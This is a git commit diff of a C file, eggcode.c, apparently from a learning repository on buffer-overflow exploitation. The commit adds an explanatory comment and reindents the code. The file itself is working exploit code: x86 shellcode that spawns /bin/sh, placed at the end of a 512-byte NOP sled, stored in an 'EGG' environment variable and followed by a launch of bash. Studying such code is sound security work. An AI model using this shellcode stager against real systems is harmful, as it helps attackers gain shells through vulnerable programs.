d978ea3ecc1833ed230c12bd7d68318e373b67af
lquayt <lquaythevenon@gmail.com>
2019-08-21 21:42:46 +0200

    Update eggcode.c

--- eggcode.c
+++ eggcode.c
@@ -1,4 +1,8 @@
 /* eggcode.c */
+/* The following is the program that will be used to store the shellcode in the environment variable. 
+Take note that the shellcode used is slightly different with the previously created however the functionality is same. 
+The constructed buffer that contains the shellcode will be stored in the “EGG” environment variable. */
+
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>  /* setenv getenv */
@@ -15,27 +19,19 @@ char shellcode[] =
 "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
 "\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
 
-
-
 int main(void)
-
 {
-
           char shell[512];
-
-
-
-            puts("Eggshell loaded into environment.\n");
-            memset(shell,NOP,512);      /* fill-up the buffer with NOP */
-              /* fill-up the shellcode on the second half to the end of buffer */
-            memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
+          puts("Eggshell loaded into environment.\n");
+          memset(shell,NOP,512);      /* fill-up the buffer with NOP */
+          /* fill-up the shellcode on the second half to the end of buffer */
+          memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
           /* set the environment variable to */
-                  /* EGG and shell as its value, rewrite if needed */
-            setenv("EGG", shell, 1);
-            /* modify the variable */
-            putenv(shell);
-              /* invoke the bash */
-            system("bash");
-            return 0;
-
+          /* EGG and shell as its value, rewrite if needed */
+          setenv("EGG", shell, 1);
+          /* modify the variable */
+          putenv(shell);
+          /* invoke the bash */
+          system("bash");
+          return 0;
 }
